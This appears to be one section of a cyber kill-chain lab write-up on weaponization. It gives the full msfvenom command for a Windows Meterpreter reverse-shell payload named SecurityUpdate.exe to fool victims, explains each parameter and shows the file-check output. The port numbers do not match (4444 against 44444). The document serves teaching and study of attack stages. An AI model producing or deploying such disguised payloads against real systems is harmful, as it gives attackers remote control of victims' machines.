# Phase 2: Weaponization

## ðŸŒŸ Objective:
Create a malicious payload that will allow the attacker to gain control of the victim's machine.

### Steps:
#### Choosing the Exploit Delivery Mechanism:
- The attacker decides to use Metasploitâ€™s MSF Venom to create a reverse TCP payload.
- The payload will execute a reverse shell, allowing the attacker to remotely control the victimâ€™s system.

#### Generating the Payload:
- The payload is created using MSF Venom and is compiled into a PP32 executable.
- The payload file is named `SecurityUpdate.exe` to avoid suspicion.

### ðŸ”¹ Payload Generation Command:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.19.19.134 LPORT=4444 -f exe -o SecurityUpdate.exe
```

### ðŸ”¹ Explanation of the Command:
| Parameter | Explanation |
|-----------|-------------|
| `msfvenom` | A tool to generate payloads for penetration testing. |
| `-p windows/x64/meterpreter/reverse_tcp` | Creates a **64-bit reverse shell** for Windows. |
| `LHOST=10.19.19.134` | The attacker's IP address. |
| `LPORT=4444` | The attacker's listening port. |
| `-f exe` | Specifies the output format as a Windows **executable** (`.exe`). |
| `-o SecurityUpdate.exe` | Saves the generated payload as `SecurityUpdate.exe`. |

### ðŸ”¹ Checking the Payload Type:
Run the `file` command:
```bash
file SecurityUpdate.exe
```
#### Expected Output:
```
SecurityUpdate.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```
- âœ… **64-bit Windows Executable**
- âœ… **Designed for Graphical UI**
- âœ… **Portable Executable (PE) format**

#### Configuring the Attacker's Machine:
- The attacker's system is set up to listen for incoming connections on port **44444**.
- This will allow the attacker to establish a reverse connection once the victim runs the payload.
